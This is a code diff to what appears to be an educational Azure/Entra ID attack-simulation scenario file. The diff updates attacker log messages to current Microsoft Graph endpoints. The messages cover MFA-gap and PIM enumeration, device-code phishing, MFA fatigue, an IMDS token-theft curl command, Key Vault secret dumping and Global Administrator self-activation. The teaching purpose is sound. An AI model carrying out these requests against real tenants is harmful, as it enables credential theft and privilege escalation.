@@ -49,7 +49,7 @@ export const entraAzureHoundScenario = [
     action: () => { highlightElement("ent_svc"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /applications+SPs"); },
   },
   {
-    logMessage: "AzureHound: GET /beta/identity/conditionalAccessPolicies. Parses all CA policies — conditions, exclusions, control gaps. Finds: legacy auth (Exchange ActiveSync) not blocked, breakglass account excluded from all policies.",
+    logMessage: "AzureHound: GET https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies. Parses all Conditional Access policies — conditions, exclusions, and control gaps. Finds: legacy auth (Exchange ActiveSync) not blocked, breakglass account excluded from all policies.",
     logType: "msgraph",
     action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /conditionalAccess"),
   },
@@ -89,12 +89,12 @@ export const entraGraphEnumScenario = [
     action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /servicePrincipals"),
   },
   {
-    logMessage: "Attacker → MS Graph: GET /beta/users?$select=userPrincipalName,strongAuthenticationDetail,authorizationInfo&$top=999. Identifies accounts with no MFA registration (authenticationMethods absent) — viable spray/phishing targets without MFA friction.",
+    logMessage: "Attacker → Microsoft Graph reports API: GET https://graph.microsoft.com/v1.0/reports/authenticationMethods/userRegistrationDetails?$filter=isMfaRegistered eq false. This is the current supported endpoint for MFA-registration state, replacing older Azure AD Graph-era properties such as strongAuthenticationDetail.",
     logType: "msgraph",
     action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /users (MFA gaps)"),
   },
   {
-    logMessage: "Attacker → MS Graph: GET /v1.0/directoryRoles?$expand=members. GET /beta/privilegedAccess/aadRoles/resources/{tid}/roleAssignments?$filter=assignmentState eq 'Eligible'. Enumerates standing admins + PIM-eligible accounts — high-value compromise targets.",
+    logMessage: "Attacker → Microsoft Graph: GET /v1.0/directoryRoles?$expand=members for standing admins. Then GET /v1.0/roleManagement/directory/roleEligibilityScheduleInstances?$expand=roleDefinition for PIM-eligible Microsoft Entra roles. This uses the current PIM API family instead of the deprecated /beta/privilegedAccess/aadRoles endpoint.",
     logType: "msgraph",
     action: () => { highlightElement("ent_admin"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /directoryRoles"); },
   },
@@ -104,7 +104,7 @@ export const entraGraphEnumScenario = [
     action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /groups/GA/members"),
   },
   {
-    logMessage: "Attacker → MS Graph: GET /beta/identity/conditionalAccessPolicies (requires Policy.Read.All, granted via AzurePowerShell token). Policy 'Block legacy auth' has exclusion: onPremisesUserPrincipalName ENDSWITH 'svc-backup'. Legacy auth unblocked for this account.",
+    logMessage: "Attacker → Microsoft Graph: GET https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies (requires Policy.Read.All). Policy 'Block legacy auth' has exclusion: onPremisesUserPrincipalName ENDSWITH 'svc-backup'. Legacy auth remains unblocked for this account.",
     logType: "msgraph",
     action: () => highlightElement("ent_tenant"),
   },
@@ -178,7 +178,7 @@ export const entraMFAFatigueScenario = [
     action: () => { highlightElement("ent_user1"); highlightElement("ent_attacker"); },
   },
   {
-    logMessage: "Attacker → Entra ID: POST /oauth2/v2.0/authorize → POST /login (alice@corp + password). Credentials valid. CA: MFA required. Entra dispatches Authenticator push notification to Alice's registered device (LAPTOP-01 / her phone).",
+    logMessage: "Attacker → Entra ID: Starts an interactive /oauth2/v2.0/authorize flow, then submits Alice's credentials through the login.microsoftonline.com ESTS web form. Credentials are valid. CA requires MFA, so Entra dispatches an Authenticator push to Alice's registered device.",
     logType: "oidc",
     action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "auth + pwd valid"),
   },
@@ -223,7 +223,7 @@ export const entraDeviceCodePhishingScenario = [
     action: () => highlightElement("ent_attacker"),
   },
   {
-    logMessage: "Attacker: POST https://login.microsoftonline.com/corp.onmicrosoft.com/oauth2/v2.0/devicecode { client_id: d3590ed6-52b3-4102-aeff-aad2292ab01c (Microsoft Office — pre-trusted), scope: openid profile offline_access https://graph.microsoft.com/.default }.",
+    logMessage: "Attacker: POST https://login.microsoftonline.com/corp.onmicrosoft.com/oauth2/v2.0/devicecode { client_id: d3590ed6-52b3-4102-aeff-aad2292ab01c (Microsoft Office), scope: openid profile offline_access User.Read }.",
     logType: "oidc",
     action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "GET device_code"),
   },
@@ -501,7 +501,7 @@ export const entraIMDSCredTheftScenario = [
     action: () => { highlightElement("ent_svc", stepDelay, "compromised"); highlightElement("ent_mi"); },
   },
   {
-    logMessage: "Attacker (via SSRF/RCE): curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net'. IMDS is link-local (169.254.x.x) — unreachable from internet, only from within the VM. No auth required.",
+    logMessage: "Attacker (via SSRF/RCE): curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/'. IMDS is link-local (169.254.x.x) — unreachable from internet, only from within the VM. No auth required.",
     logType: "imds",
     action: () => addTemporaryEdge("ent_svc", "ent_mi", "imds", "steal MI token (SSRF)"),
   },
@@ -511,7 +511,7 @@ export const entraIMDSCredTheftScenario = [
     action: () => addTemporaryEdge("ent_mi", "ent_attacker", "imds", "MI token (vault.azure.net)"),
   },
   {
-    logMessage: "Attacker → Key Vault: GET https://corp-kv.vault.azure.net/secrets?api-version=7.4 (Authorization: Bearer <MI_token>). Lists all secret names. GET /secrets/{name}/{version} for each → retrieves plaintext values: db-connstr, stripe-api-key, ssh-private-key, mssql-sa-password.",
+    logMessage: "Attacker → Key Vault: GET https://corp-kv.vault.azure.net/secrets?api-version=2025-07-01 (Authorization: Bearer <MI_token>). Lists all secret names. Then GET /secrets/{name}/{version}?api-version=2025-07-01 for each one — retrieves plaintext values such as db-connstr, stripe-api-key, ssh-private-key, and mssql-sa-password.",
     logType: "azurerm",
     action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "GET /secrets/* (MI token)"),
   },
@@ -556,12 +556,12 @@ export const entraPIMTakeoverScenario = [
     action: () => highlightElement("ent_admin", stepDelay, "compromised"),
   },
   {
-    logMessage: "Attacker → Entra PIM API (as EntraAdmin): GET /beta/privilegedAccess/aadRoles/resources/{tenantId}/roleAssignments?$filter=subjectId eq '{adminObjectId}'&$expand=roleDefinition. Confirms: GlobalAdministrator eligible, maxActivationDuration: PT8H, approvalRequired: false.",
+    logMessage: "Attacker → Microsoft Graph PIM API (as EntraAdmin): GET https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleInstances?$filter=principalId eq '{adminObjectId}' and roleDefinitionId eq '62e90394-69f5-4237-9190-012177145e10'&$expand=roleDefinition. Confirms: GlobalAdministrator eligible, maxActivationDuration: PT8H, approvalRequired: false.",
     logType: "msgraph",
     action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET PIM eligible roles"),
   },
   {
-    logMessage: "Attacker → Entra PIM: POST /beta/privilegedAccess/aadRoles/roleAssignmentRequests { roleDefinitionId: '62e90394-...', type: UserAdd, assignmentState: Active, justification: 'Routine maintenance INC-0042', scheduleInfo: { duration: PT8H } }.",
+    logMessage: "Attacker → Microsoft Graph PIM API: POST https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests { action: 'selfActivate', principalId: <adminObjectId>, roleDefinitionId: '62e90394-69f5-4237-9190-012177145e10', directoryScopeId: '/', justification: 'Routine maintenance INC-0042', scheduleInfo: { startDateTime: <now>, expiration: { type: 'afterDuration', duration: 'PT8H' } } }.",
     logType: "msgraph",
     action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST PIM activate GA"),
   },
@@ -669,7 +669,7 @@ export const entraLegacyAuthAbuseScenario = [
     action: () => highlightElement("ent_attacker"),
   },
   {
-    logMessage: "Recon: AzureHound CA policy dump shows 'Block legacy auth' policy is NOT applied to the 'Sync accounts' group. Tenant admin re-enabled SMTP AUTH for shared mailboxes. GET /beta/identity/conditionalAccessPolicies — confirms legacy auth exclusions and exempted users.",
+    logMessage: "Recon: AzureHound CA policy dump shows 'Block legacy auth' policy is NOT applied to the 'Sync accounts' group. Tenant admin re-enabled SMTP AUTH for shared mailboxes. GET https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies confirms the legacy-auth exclusions and exempted users.",
     logType: "msgraph",
     action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "CA policy enum"),
   },
